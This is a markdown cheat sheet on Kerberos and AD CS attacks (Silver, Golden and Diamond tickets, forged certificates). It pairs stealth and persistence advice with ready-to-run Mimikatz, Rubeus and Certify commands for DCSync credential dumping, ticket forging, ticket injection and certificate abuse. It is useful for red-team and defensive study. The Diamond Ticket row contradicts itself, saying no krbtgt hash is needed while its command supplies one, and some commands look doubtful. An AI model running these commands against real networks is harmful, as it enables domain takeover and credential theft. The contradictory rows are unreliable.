# Kerberos Attack Techniques Comparison

| **Technique**           | **What Is It?**                                                                                                                                                                                                 | **When to Use**                                                                                                                                                                                                          | **Why Use This Approach?**                                                                                                                                                                                                                                                                                                                                                                                                                                | **Basic Steps**                                                                                                                                                                                                                                       | **Example Commands/Tools**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Silver Ticket**       | A **forged Ticket Granting Service (TGS) ticket** for a specific service (e.g., CIFS) using the **service account’s** NTLM or AES key.                                                                               | When you have access to a **service account’s hash/AES key** and want **persistent or stealthy access** to a **specific service** without alerting the Domain Controller (DC).                                              | - **Offline** creation: Does not require interaction with the DC.<br>- **Stealthier**: Bypasses DC logs.<br>- **Limited scope**: Only grants access to the targeted service, reducing detection chances compared to domain-wide attacks.                                                                                                                                                                                                                      | 1. **Acquire service account hash/AES key** (e.g., via Mimikatz DCSync, secretsdump.py).<br>2. **Obtain the target user’s SID**.<br>3. **Forge the TGS** using Rubeus or Mimikatz.<br>4. **Inject/Import the ticket** into your session.                                                                                                                                                     | - **Dump Service Account Keys** (Mimikatz):<br>  `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:svc_cifs" "exit"`<br>- **Forge Silver Ticket** (Rubeus):<br>  `Rubeus.exe silver /service:cifs/machine.domain /aes256:<key> /user:USER /domain:DOMAIN /sid:<SID> /nowrap`<br>- **Inject Ticket** (Mimikatz):<br>  `mimikatz.exe "kerberos::ptt cifs.kirbi" exit` |
| **Golden Ticket**       | A **forged Ticket Granting Ticket (TGT)** for **any user** in the domain, created using the **krbtgt account’s** NTLM or AES key.                                                                                        | When you need **domain-wide access**, especially after **compromising the krbtgt account’s hash/AES key**, allowing you to impersonate any user and access any service within the domain.                                               | - **Domain-wide impact**: Grants the ability to impersonate any user, including Domain Admins.<br>- **Persistence**: Remains valid until the krbtgt password is changed.<br>- **Full control**: Can request service tickets for any service without restriction.                                                                                                                                                                                                              | 1. **Dump the krbtgt account’s hash/AES key** (via Mimikatz DCSync).<br>2. **Collect target user’s SID**.<br>3. **Forge the TGT** using Rubeus or Mimikatz.<br>4. **Inject the TGT** into memory.<br>5. **Access any domain resource** using the forged TGT.                                                                                                               | - **Dump krbtgt Key** (Mimikatz):<br>  `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"`<br>- **Forge Golden Ticket** (Rubeus):<br>  `Rubeus.exe golden /aes256:<krbtgtkey> /user:<USER> /domain:<DOMAIN> /sid:<SID> /nowrap`<br>- **Inject Ticket** (Mimikatz):<br>  `mimikatz.exe "kerberos::ptt golden.kirbi" exit` |
| **Diamond Ticket**      | A **forged TGT** created by capturing a **delegation-based TGS (AP-REQ)** from the DC, decrypting it, modifying the PAC (Privilege Attribute Certificate), and re-encrypting it to produce a new TGT with custom group memberships. | When you can perform **Kerberos delegation** or have access to a **forwardable/delegable TGS** and want to create a **TGT with elevated privileges** without having the krbtgt hash.                                                       | - **No need for krbtgt hash**: Useful when the krbtgt account is secured.<br>- **Custom privileges**: Allows adding specific group memberships to the PAC.<br>- **Stealthy**: Limits the scope to desired privileges, reducing detection compared to Golden Tickets.                                                                                                                                                                                                 | 1. **Obtain a valid delegation TGS** (e.g., via Rubeus `diamond` command).<br>2. **Decrypt and modify the PAC** to include desired group memberships.<br>3. **Re-encrypt and forge the new TGT**.<br>4. **Inject the modified TGT** into memory.<br>5. **Utilize elevated privileges** within the domain.                                                                                                 | - **Forge Diamond Ticket** (Rubeus):<br>  `Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:<krbtgtkey> /nowrap`<br>- **Inject Ticket** (Rubeus):<br>  `Rubeus.exe ptt /ticket:<base64ticket>`<br>- **Optional Steal Token** (Rubeus):<br>  `Rubeus.exe steal /process:explorer`                                                                                 |
| **Forged Certificates** | Crafting **malicious certificates** (e.g., via AD CS misconfigurations) or forging **Smartcard/PKINIT** certificates to authenticate as a user or domain admin.                                                           | When **Active Directory Certificate Services (AD CS)** is misconfigured (e.g., ESC8, ESC1) or you can **issue user certificates** with elevated privileges, allowing certificate-based authentication without passwords.                   | - **Bypasses traditional authentication**: Uses certificate-based logins, avoiding reliance on passwords or NTLM hashes.<br>- **Stealthier**: Can blend with legitimate certificate traffic.<br>- **Versatile**: Useful in environments where certificate-based authentication is prevalent.                                                                                                                                                                                            | 1. **Identify misconfigured AD CS** (e.g., vulnerable templates).<br>2. **Request or forge a certificate** using tools like Certify.exe or Certipy.<br>3. **Use the certificate** to obtain a TGT via PKINIT or perform smartcard logins.<br>4. **Access domain resources** as the certificate-bound user.                                                                                                                     | - **Enumerate AD CS Vulnerabilities** (Certify.exe):<br>  `Certify.exe enumerate /vulnerable`<br>- **Request/Forge Certificate** (Certify.exe):<br>  `Certify.exe request /ca:CAName /template:VulnerableTemplate`<br>- **Obtain TGT with Certificate** (Rubeus):<br>  `Rubeus.exe asktgt /user:USER /certificate:C:\cert.pfx /password:CertPass /domain:DOMAIN`                                                                                                                                  |

---

## Key Takeaways

- **Silver Ticket**
  - **Scope**: Single service.
  - **Pros**: Stealthy, offline creation.
  - **Cons**: Limited to specific service access.

- **Golden Ticket**
  - **Scope**: Entire domain.
  - **Pros**: Full control, domain-wide access.
  - **Cons**: Requires krbtgt hash, high visibility.

- **Diamond Ticket**
  - **Scope**: Customized TGT with specific privileges.
  - **Pros**: Elevated privileges without krbtgt, stealthier than Golden.
  - **Cons**: Requires delegation-based TGS access.

- **Forged Certificates**
  - **Scope**: Certificate-based authentication.
  - **Pros**: Bypasses password-based defenses, stealthy.
  - **Cons**: Requires AD CS misconfigurations or CA compromises.

